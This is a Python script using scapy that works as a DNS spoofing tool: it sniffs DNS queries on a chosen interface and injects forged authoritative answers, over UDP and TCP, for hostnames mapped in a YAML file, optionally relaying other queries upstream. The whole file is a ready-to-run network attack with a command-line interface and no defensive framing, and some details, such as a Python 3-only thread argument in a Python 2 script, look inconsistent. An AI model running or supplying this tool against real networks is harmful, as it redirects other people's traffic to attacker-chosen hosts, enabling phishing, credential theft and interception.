#!/usr/bin/env python2
# -*- coding: utf-8 -*-    

from __future__ import print_function, absolute_import

import argparse
import ipaddress            # pip2 install ipaddress
import logging
import os
import signal
import socket
import sys
import threading
import time
import yaml

from scapy.all import (
    DNS, DNSQR, DNSRR,
    IP, IPv6,
    UDP, TCP,
    send, sniff,
)

# --------------------------------------------------------------------------- #
# helpers
# --------------------------------------------------------------------------- #
def _u(s):
    """Return a unicode object under Py-2, no-op on Py-3."""
    try:
        return unicode(s)   # noqa: F821  (undefined in Py-3, caught by try)
    except NameError:
        return s            # already unicode in Py-3

def setup_logging(verbose, quiet):
    if verbose and quiet:
        quiet = False
    lvl = logging.DEBUG if verbose else (logging.ERROR if quiet else logging.INFO)
    logging.basicConfig(
        level=lvl,
        format='%(asctime)s %(levelname).1s: %(message)s',
        datefmt='%H:%M:%S',
    )

def _normalise_qname(name):
    return _u(name).rstrip(u'.').lower()

# --------------------------------------------------------------------------- #
# main worker
# --------------------------------------------------------------------------- #
class DNSSpoofer(threading.Thread):
    """Spoof or relay DNS answers over both UDP and TCP."""

    def __init__(self, iface, mapping, upstream='8.8.8.8',
                 relay=False, ttl=300, bpf=None):
        threading.Thread.__init__(self)
        self.daemon   = True
        self.iface    = iface
        self.mapping  = mapping
        self.upstream = upstream
        self.relay    = relay
        self.ttl      = ttl
        self.bpf      = bpf or 'udp or tcp port 53'

        self._running = threading.Event()
        self._running.set()
        self._tcp_thr = None

    # ----------------------------------------  lookup / craft helpers
    def _lookup(self, qname):
        qname = _normalise_qname(qname)
        if qname in self.mapping:
            val = self.mapping[qname]
            return val if isinstance(val, list) else [val]

        # wildcard match  (“*.example.com”)
        it = self.mapping.iteritems() if hasattr(self.mapping, 'iteritems') else self.mapping.items()
        for pattern, val in it:
            if pattern.startswith(u'*.') and qname.endswith(pattern[2:]):
                return val if isinstance(val, list) else [val]
        return None

    def _build_answers(self, qname, ips, qtype):
        answer = None
        for ip in ips:
            rr = DNSRR(rrname=qname, type=qtype, ttl=self.ttl, rdata=str(ip))
            answer = rr if answer is None else answer / rr
        return answer

    def _forge_response(self, pkt, ips):
        q      = pkt[DNSQR]
        answer = self._build_answers(q.qname, ips, q.qtype)
        dns    = DNS(id=pkt[DNS].id, qr=1, aa=1,
                     qd=q, ancount=len(ips), an=answer)

        ip_l   = IP(src=pkt[IP].dst,   dst=pkt[IP].src) if IP   in pkt else \
                 IPv6(src=pkt[IPv6].dst, dst=pkt[IPv6].src)

        if UDP in pkt:
            udp = UDP(sport=53, dport=pkt[UDP].sport)
            return ip_l / udp / dns
        else:
            tcp = TCP(sport=53, dport=pkt[TCP].sport,
                      flags='PA',
                      seq=pkt[TCP].ack,
                      ack=pkt[TCP].seq + len(pkt[TCP].payload))
            return ip_l / tcp / dns

    # ----------------------------------------  packet processors
    def _process_udp(self, pkt):
        if not pkt.haslayer(DNS) or pkt[DNS].qr != 0:
            return
        qname = pkt[DNSQR].qname.decode()        # bytes → unicode
        ips   = self._lookup(qname)
        if ips:
            send(self._forge_response(pkt, ips), iface=self.iface, verbose=0)
            logging.info('Spoofed %s → %s', qname, ', '.join(ips))
        elif self.relay:
            self._relay_upstream(pkt)

    def _process_tcp(self, pkt):
        if not pkt.haslayer(DNS) or pkt[DNS].qr != 0:
            return
        qname = pkt[DNSQR].qname.decode()
        ips   = self._lookup(qname)
        if ips:
            send(self._forge_response(pkt, ips), iface=self.iface, verbose=0)
            logging.info('(TCP) Spoofed %s → %s', qname, ', '.join(ips))
        elif self.relay:
            self._relay_upstream(pkt)

    # ----------------------------------------  relay (UDP-only to upstream)
    def _relay_upstream(self, pkt):
        qname = pkt[DNSQR].qname.decode()
        sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        try:
            sock.sendto(bytes(pkt[DNS]), (self.upstream, 53))
            data, _ = sock.recvfrom(4096)
        except socket.timeout:
            logging.warning('Upstream timeout for %s', qname)
            return
        finally:
            sock.close()

        ip_l   = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        udp_l  = UDP(sport=53, dport=pkt[UDP].sport)
        send(ip_l / udp_l / DNS(data), iface=self.iface, verbose=0)

    # ----------------------------------------  thread lifecycle
    def run(self):
        logging.info('DNS spoofing on %s  (relay=%s)  filter="%s"',
                     self.iface, self.relay, self.bpf)

        # TCP sniffer runs in secondary thread
        self._tcp_thr = threading.Thread(
            target=lambda: sniff(
                iface=self.iface,
                filter='tcp and (%s)' % self.bpf,
                prn=self._process_tcp,
                store=0,
                stop_filter=lambda *_: not self._running.is_set(),
            ),
            daemon=True)
        self._tcp_thr.start()

        # UDP sniffer (main thread)
        sniff(iface=self.iface,
              filter='udp and (%s)' % self.bpf,
              prn=self._process_udp,
              store=0,
              stop_filter=lambda *_: not self._running.is_set())

    def stop(self):
        self._running.clear()
        if self._tcp_thr and self._tcp_thr.is_alive():
            self._tcp_thr.join(0.5)

# --------------------------------------------------------------------------- #
# YAML mapping loader
# --------------------------------------------------------------------------- #
def load_mapping(path):
    raw = yaml.safe_load(open(path, 'rb'))
    if not isinstance(raw, dict):
        raise ValueError('YAML must be a dictionary of host → IP')

    mapping = {}
    it = raw.iteritems() if hasattr(raw, 'iteritems') else raw.items()
    for host, value in it:
        host_norm = _normalise_qname(host)
        ips_raw   = value if isinstance(value, list) else [value]

        good = []
        for ip in ips_raw:
            try:                                # ipaddress needs unicode
                ipaddress.ip_address(_u(ip))
                good.append(str(ip))
            except ValueError:
                logging.warning('Ignoring invalid IP "%s" (host %s)',
                                ip, host_norm)
        if good:
            mapping[host_norm] = good if len(good) > 1 else good[0]
    return mapping

# --------------------------------------------------------------------------- #
# CLI
# --------------------------------------------------------------------------- #
def main():
    ap = argparse.ArgumentParser(description='DNS spoof / relay (Python-2.7)')
    ap.add_argument('-i', '--iface', required=True, help='Network interface')
    ap.add_argument('-m', '--map',   required=True, help='YAML mapping file')
    ap.add_argument('--relay', action='store_true',
                    help='Forward unmatched queries upstream')
    ap.add_argument('--upstream', default='8.8.8.8',
                    help='Upstream DNS for relay mode')
    ap.add_argument('--ttl', type=int, default=300,
                    help='TTL for forged answers')
    vq = ap.add_mutually_exclusive_group()
    vq.add_argument('-v', '--verbose', action='store_true')
    vq.add_argument('-q', '--quiet',   action='store_true')
    ap.add_argument('--bpf', help='Extra BPF to AND with port 53')

    args = ap.parse_args()
    setup_logging(args.verbose, args.quiet)

    try:
        mapping = load_mapping(args.map)
    except Exception as exc:
        logging.error('%s', exc)
        sys.exit(1)
    if not mapping:
        logging.error('No valid host→IP mappings – aborting')
        sys.exit(1)

    spoofer = DNSSpoofer(args.iface, mapping,
                         upstream=args.upstream,
                         relay=args.relay,
                         ttl=args.ttl,
                         bpf=args.bpf)
    spoofer.start()

    def _sigint(_sig, _frm):
        logging.info('Ctrl-C received – shutting down')
        spoofer.stop()
    signal.signal(signal.SIGINT, _sigint)

    while spoofer.is_alive():
        time.sleep(0.3)
    logging.info('Bye!')

if __name__ == '__main__':
    main()
